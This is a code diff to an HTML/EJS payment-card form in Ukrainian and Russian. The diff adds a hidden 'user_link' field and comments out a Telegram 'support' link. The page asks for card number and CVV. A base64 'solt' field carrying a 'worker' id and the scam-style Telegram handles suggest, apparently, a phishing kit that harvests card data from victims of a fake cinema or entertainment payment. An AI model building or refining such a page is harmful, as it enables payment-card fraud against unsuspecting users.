@@ -822,6 +822,7 @@
 	});
 	</script>
 	<div class="wrapper" id="app">
+		<input type="hidden" name="user_link" value=<%= user_link %>>
 		<input type="hidden" name="amount" value=<%= amount %>>
 		<div class="card-form">
 			<br>
@@ -919,15 +920,15 @@
 							<input type="text" placeholder="***" name="cvc2" class="card-input__input" id="cardCvv" v-mask="'####'" maxlength="3" v-model="cardCvv" v-on:focus="flipCard(true)" v-on:blur="flipCard(false)" autocomplete="off" required> </div>
 					</div>
 				</div>
-				<h3 style="text-align: center; margin: 0px;">Сумма до сплати <%= amount %> грн</h3>
+				<h3 style="text-align: center; margin: 0px;"><%= amount_c %></h3>
 				<div class="credit-card-form__submit">
 					<div class="credit-card-form__submit-inner">
 						<input type='submit' class='card-form__button' name='submit' value='Оплатить'>
 						<input type='hidden' name='solt' value='eyJpZCI6ImZhYzJkZWJiM2NlNSIsImNhc2giOiJwYXkiLCJ3b3JrZXIiOm51bGx9'> </div>
 				</div>
 				<br/>
-				<h4 style="text-align: center; margin: 0px;">Хвилюешься через персональнi дані карти?</h4>
-				<a href="https://t.me/funnyhub_support"><h5 style="text-align: center; margin: 0px;">Поповнюй через тех. пiдтримку</h5></a>
+				<!-- <h4 style="text-align: center; margin: 0px;">Хвилюешься через персональнi дані карти?</h4>
+				<a href="https://t.me/CinemaFunny_Support"><h5 style="text-align: center; margin: 0px;">Поповнюй через тех. пiдтримку</h5></a> -->
 			</div>
 			<center>
 				<svg id="svg-secure-connection" viewBox="0 0 105 32" style="width:20%; margin:20px 10px">
